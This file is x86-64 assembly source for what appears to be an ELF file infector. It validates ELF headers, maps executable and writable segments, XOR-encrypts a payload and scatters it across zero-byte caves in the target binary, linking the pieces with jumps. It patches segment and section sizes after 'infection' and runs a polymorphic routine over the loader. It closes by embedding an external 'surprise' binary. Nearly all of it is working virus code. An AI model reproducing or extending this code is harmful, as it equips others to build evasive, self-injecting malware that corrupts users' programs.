;OUT: rax - 0(ERROR); rbp - addr of bufer with NEW code;   rcx - size of NEW code;
;CAN CHANGE: rdi, rdx, r9, r11, r12, r13, r14, r15
;---------------------------------------------------------------------------------------------------------------------------
collect_shell_exec:
      push  rsi
      push  rdi
      push  rdx
      
      push  rbp
      pop   rdi
      add   rdi,  200
      mov   rsi,  r13
      call  collect_shell
   cll_sh_exec:
;----------------
      mov   r8,   rbp
      add   r8,   OFFS_TAB_LEN_COD
      ;push  rbp
      ;pop   rsi
      ;add   rsi,  200
      push  rdi
      pop   rsi
      push  rbp
      pop   rdi
      call  _polimorph     ;OUT: rax - addr of command 'add rsi, rax' in buf TO;  rcx - size of new START_LOADER; r8 - start addr of 'tab_code_len';
      cmp   rax,  0
      je    cor_err_ml

      push  rcx

      cmp   byte[rax-1],   0x58     ;'pop rax'
      jne   .a
      sub   rax,  6
      jmp   .b
   .a:
      sub   rax,  8
   .b:
      xor   ebx,  ebx
      mov   cl,   0           ;eax
      call  correct_st_load      ;write "BBBBBBBB" - for 'write_shell'
      add   rax,  3
      push  1
      pop   rbx
      mov   cl,   1           ;ecx
      call  correct_st_load
      push  rbp
      pop   rbx
      sub   rbx,  0x2800      ;key
      mov   cl,   2           ;edx
      call  correct_st_load
      pop   rcx
    cor_err_ml:
;-------------------      
   cll_sh_exit:
      pop   rdx
      pop   rdi
      pop   rsi
   ret
;----------------------------------------------------------------------------------------------------------------
;IN:  rax - addr of command; ;ebx - offset, or size, or nothing; cl - opcode of register(3bits);
;OUT: rax - addr of next command;
;----------------------------------------------------------------------------------------------------------------
correct_st_load:
         cmp   ebx,  0
         jne   cstl_strt
         mov   ebx,  0xBBBBBBBB 
      cstl_strt:
         mov   ch,   cl
         or    ch,   0xB8
         push  rcx
         or    cl,   0x58
         cmp   word[rax+2],  cx       ;'push 0; pop rreg' + 0xBX(mov ereg, imm32)   
         je    cstl_nxt1
         cmp   byte[rax+5],   cl      ;'push imm32; pop rreg'
         je    cstl_nxt0
         pop   rcx
         push  rax
         mov   al,   cl
         shl   cl,   3
         or    cl,   al
         pop   rax
         or    cl,   0xC0
         cmp   word[rax+2],  cx       ;'xor rreg,  rreg' + 0xBX(mov ereg, imm32)
         je    cstl_nxt2
         push  rcx
         cmp   byte[rax],  ch
         jne   cstl_err
             cstl_nxt0:
               pop   rcx
               cmp   ebx,  1
               je    cstl_nx1
               mov   dword[rax+1],  ebx 
             cstl_nx1:
               cmp   word[rax+5],   0x6348      ;'movsxd rreg, ereg'
               je    cstl_exit
               cmp   byte[rax],  0x68
               jne   cstl_nx2
               add   rax,  6
              ret
             cstl_nx2:
               add   rax,  5
              ret
            cstl_nxt1:
               pop   rcx
            cstl_nxt2:
               cmp   ebx,  1
               je    cstl_exit
               mov   dword[rax+4],  ebx 
            cstl_exit:
               add   rax,  8
              ret
      cstl_err:
         pop   rcx
         xor   ebx, ebx 
      ret
;----------------------------------------------------------------------------------------------------------------
;BYTES:  52
;IN: rdi - start addr of file
;OUT: al = 0(not ELF); al = 2(file EXECUT);   al = 3(file DYNAMIC);  rdi - start addr of file in memory;
;     si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum;) 
;----------------------------------------------------------------------------------------------------------------
check_exec:                                        
      cmp   dword[rdi],    0x464C457F
      jne   check_exec_err
      mov   al,   byte[rdi+16]
      cmp   al,   0x03
      je    check_exec_out
      cmp   al,   0x02
      jne    check_exec_err
check_exec_out:
      cmp   byte[rdi+52], 64        ;e_ehsize
      jne   check_exec_err
      mov   r10,  [rdi+32]          ;e_phoff
      mov   r11,  [rdi+40]          ;e_shoff
      xor   rsi,  rsi
      push  rsi
      pop   rdx
      mov   si,  word[rdi+56]     ;e_ephnum
      mov   dx,  word[rdi+60]     ;e_shnum
   ret
check_exec_err:
      xor   al,   al
   ret
;-------------------------------------------------------------------------------------------------------------------------------------------
;BYTES: 37 + 34(check_seg_flags) 
;IN:  rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;OUT: r9- bit map of READ/READ and WRITE segments; r9(31-63 bits) - bit map of EXEC segments;
;-------------------------------------------------------------------------------------------------------------------------------------------
check_seg:
      push  rdi
      xor   r9,  r9
      push  r9
      pop   rcx
      mov   cx,   si
      dec   cl
      push  56
      pop   rax
      add   rdi,  r10
      mul   cl
      add   rdi,  rax
   ine_loop1:
      cmp   byte[rdi], 1   ;check PROGRAM segment is LOAD or NOT
      jne   ine_ret1 
      ;call  check_seg_flags
      jmp   check_seg_flags
   ine_ret1:
      sub   rdi, 56 
      loop  ine_loop1
   ine_shell2_exit:
      pop   rdi
      ret
;-------------------------------------------------------------------------------------------------------------------------------------------
;BYTES: 34
;IN:  rdi - addr of p_type in file;   rcx - number of curr segment; rbx - bit map of EXEC(31-63bits)/READ/READ and WRITE segments;
;OUT: r9 - bit map of READ/READ and WRITE segments; r9(31-63 bits) - bit map of EXEC segments;
;------------------------------------------------------------------------------------------------------------------------------------------- 
   check_seg_flags: 
      test  byte[rdi+4],   0x01  ;EXEC
      jz    ch_fl_rw
      rol   r9,  32
      bts   r9,  rcx
      rol   r9,  32 
      jmp   ch_fl_exit
   ch_fl_rw:
      test  byte[rdi+4],  0x06     ;READ/ READ WRITE 
      jz    ch_fl_exit
      bts   r9,  rcx
   ch_fl_exit:
      jmp   ine_ret1
   ;ret
;---------------------------------------------------------------------------------------------------------------------------
;BYTES:  28
;IN:  rax - addr of modified segment header; rcx - size of data; rbx - the addr from which the injection begins;
;rdi - addr of zero offset of file;  si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff;
;OUT: rax - number of section header which was infected;  rax == 0 => ERROR(wasn't infected);
;---------------------------------------------------------------------------------------------------------------------------
correct_sizes:
   sz_segm:
      add   [rax+32],   rcx ;p_filesize
      add   [rax+40],   rcx ;p_memsize
   sz_sect:
      push  rbx
      push  rdi
      push  rdx
      sub   rbx,  rdi
      add   rdi,  r11
      push  -40
      pop   rax
   sz_sect_loop:
      cmp   dl,   0
      je    sz_sect_exit
      dec   dl
      add   rax,  64          ;[rdi+r11+24(rax)] = sh_offset
      cmp   rbx,   [rdi+rax]        
      jl    sz_sect_loop
      cmp   rbx,  [rdi+rax+64]
      jge    sz_sect_loop

      add   [rdi+rax+8],   rcx
      pop   rax
      push  rax
      sub   rax,  rdx
   sz_sect_exit:    
      pop   rdx
      pop   rdi
      pop   rbx
   ret
;================================================================================================================================================================================
;BYTES:  68 + 25(xor_code)
;IN:  rdi - addr of zero offset of file;  si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;r12 - key; r9 - bit map of EXEC/READ/READ and WRITE segments; rcx - size of inect bufer;   rsi- addr of inect bufer; 
;OUT: rax - 0 (error) /  rax - p_offset (segment file offset that was infected); r9-changed; rbx - the addr from which the injection begins; 
;================================================================================================================================================================================
inect_shell_data:
;-----------------------------------------------------------------------------------------------------------
;BYTES: 25 
;IN:  rsi - addr of FROM bufer;  rdi - addr of TO bufer; rcx - size of data;  r12 - key;
;-----------------------------------------------------------------------------------------------------------
xor_code:
      push  rax
      push  rcx
      push  rsi
   c_strt1:
      lodsd
      xor   eax, r12d
      stosd
      sub   rcx, 3   
      loop  c_strt1
      pop   rsi
      pop   rcx
      pop   rax
   ret
;====================================================================================================================================;
;IN:  rsi - bufer of code;  rdi - addr of section in memory;   rdx - size of section;  r8 - size of code;   r9 - addr of tab_code_len;
;OUT: r8 - remaining code size;  r14 - addr from inection begins                                                                                                                              ;
;====================================================================================================================================;
   find_nork:
      f_nork:
         xor   rcx,  rcx
         jmp   ch_quor
      f_n1:
         cmp   rcx,  8
         jge   wr_nork
      f_n11:
         xor   rcx,  rcx
         call  di_dx
      f_n12:
         cmp   rdx, 0
         jle   f_out
         cmp   rcx, r8
         jge   wr_nork
      ch_quor:
         cmp   byte[rdi],  0x00  ;qword[rdi], 0x00
         jne   f_n1
         call  cx_di_dx
         cmp   rdx,  0
         jle   f_out
         cmp   byte[rdi],  0x00  ;qword[rdi], 0x00
         jne   f_n1
      f_n2:
         call  cx_di_dx
         jmp   f_n12
 
   wr_nork:
         sub   rdi, rcx
         cmp   r10, 0
         je    wr_she
      my_ip_nork:
         push  rdi
         pop   rax
         sub   rax, r10
         sub   rax, 4
         cmp   r9,   0
         je    wr_bjmp1
         push  rax         ;@

         cmp   eax, 125
         jg    wr_bjmp
         cmp   eax,  -125
         jl    wr_bjmp
         mov   rax,  rcx
         sub   al,   6
         sub   al,   [r9]
         cmp   al,   0
         jl    wr_bjmp
         push  rdi
         push  rcx
         mov   rdi,  r10
         dec   rdi
         push  6
         pop   rcx
         push  3
         pop   rax
         call  write_shell
         sub   qword[rsp+8*6],   rbx      ;[rsp+(8*9)] == 'push r8' from nork_seg_loop
         pop   rcx
         pop   rdi
         cmp   al, 0
         je    wr_bjmp
         
         pop   rax            ;@
         
         mov   byte[r10+3], al
         jmp   wr_she
      wr_bjmp:
         pop   rax            ;@
      wr_bjmp1:
         mov   dword[r10], eax
      wr_she:
         cmp   r8,   rcx
         jg    wr_she1
         push  1
         pop   rax
         jmp   wr_she2
      wr_she1:
         push  6
         pop   rax
      wr_she2:
         call  write_shell;rep   movsb
         cmp   rax,  0
         jne   wr_ok
      wr_ok:
         mov   r10, rdi
         add   rdi, 5      ;4
      wr_ok1:
         cmp   r8, 0
         jg    f_n11
         jmp   f_end
      f_out:
         cmp   rcx, 8
         jge   wr_nork
      f_end:
         cmp   r8, 0
         jge   f_exit
         xor   r8, r8
      f_exit:
      ret

   cx_di_dx:
         add   rcx,  1  ;8
      di_dx:
         add   rdi, 1   ;8
         sub   rdx, 1   ;8
      ret
;============================================================================================================================;
;IN: rdi-addr in file;  rsi-addr of code; rcx-size of free space in file for code; r8-size of code; r9 - addr of tab_code_len;
;OUT: rdi-addr of "jmp 'next comand of shell code'";  rsi-addr of code; r9 - addr of tab_code_len; r8 - remaining code size  ;
;rbx - count of bytes were written;                                                                                          ; 
;============================================================================================================================;
  write_shell:
         push  rcx
         push  rdx
         sub   rcx, rax               ;size of jmp command + ret(0xC3)
         ;push  rbp
         cmp   al,   1
         jne   wr_sh
         inc   cl
     wr_sh:
         push  r15
         push  rax            ;#
         xor   rax, rax
         cmp   r9,   0
         jne   w_s_f
         push  rcx
         pop   rax
         jmp   w_shell
     w_s_f:
         add   al, byte[r9]
         inc   r9
         cmp   rax, r8
         jge   w_shell
         cmp   rax, rcx
         jl    w_s_f
         je    w_shell
         sub   al, byte[r9-1]
         dec   r9
         cmp   al,  0
         jne   w_shell
         pop   rax               ;#
      w_sf_out:
         xor   rax,  rax
         jmp   w_shell_exit
   w_shell:
         cmp   rax, r8
         jl    w_sh
         xchg  rax, r8
         xor   r8, r8
   w_sh:
         cmp   r14, 0
         jne   w_sh1
         push  rdi
         pop   r14
    w_sh1:
         sub   r8,   rax
   w_no_ow1:
         push  rax
         push  rcx
         pop   rdx
         pop   rcx
         sub   rdx, rcx 
         push  rcx
   w_no_ow2:
         cmp   byte[rsi],  0xB8      ;part of opcode 'mov eax, ...'
         je    write_offs
         ;cmp   byte[rsi],  0xBA      ;opcode 'mov edx, ...'
         ;je    write_key
   w_no_ow3:
         movsb
   w_no_ow4:
   loop  w_no_ow2
         pop   rbx
         pop   rax            ;#
         cmp   r8, 0
         jle   w_shell_exit
         cmp   rax,  6
         je    w_6
      wsf_o:
         mov   rcx,  0xEB           ;near jmp 
         dec   rax
         add   rdi,  rdx
         cmp   dl, 1
         jne   bl_2
         mov   byte[rdi-1], 0x00
         jmp   w_anth
      bl_2:
         cmp   dl, 2
         jne   w_anth 
      bl1_2:
         mov   word[rdi-2], 0x00
         jmp   w_anth
      w_6:
         mov   rcx,  0xE9  ;far jmp
         dec   rax
   w_anth:
         mov   byte[rdi], cl           ;jmp(0xE9/0xEB)
         mov   byte[rdi+rax], 0xC3   ;ret(0xC3)
         inc   rdi
   w_shell_exit:
         ;pop   rbp
         pop   r15
         pop   rdx
         pop   rcx
   ret

   write_offs:
         cmp   dword[rsi+1],  0xBBBBBBBB      ;'mov ereg, 0xBBBBBBBB'
         jne   w_no_ow3
         sub   r15,  r13
         movsb
         mov   dword[rdi],   r15d
         sub   cl,   4
         add   rdi,  4
         add   rsi,  4
      jmp   w_no_ow4
   ;ret
%include       "hde64.asm"
surp:    times 10 db 0xCC
;================================================================================================
;                    SURPRISE
;================================================================================================
incbin "surp.bin"
incbin "surp.bin"
incbin "surp.bin"
incbin "surp.bin"
incbin "surp.bin"
